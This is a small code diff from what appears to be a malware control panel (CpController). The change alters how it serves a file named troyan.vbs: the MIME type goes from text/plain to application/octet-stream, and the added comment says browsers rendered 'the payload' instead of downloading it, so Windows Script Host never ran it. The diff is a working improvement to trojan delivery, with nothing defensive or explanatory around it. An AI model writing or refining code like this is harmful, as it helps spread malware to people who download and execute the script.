@@ -108,7 +108,8 @@ public class CpController : BaseController
         var path = _serverService.Layout().UserTroyanVbs;
         if (!System.IO.File.Exists(path))
             return NotFound();
-        return PhysicalFile(path, "text/plain", "troyan.vbs");
+        // text/plain makes browsers render the payload in-tab instead of downloading; WSH never runs it.
+        return PhysicalFile(path, "application/octet-stream", "troyan.vbs");
     }
 
     [HttpPost]
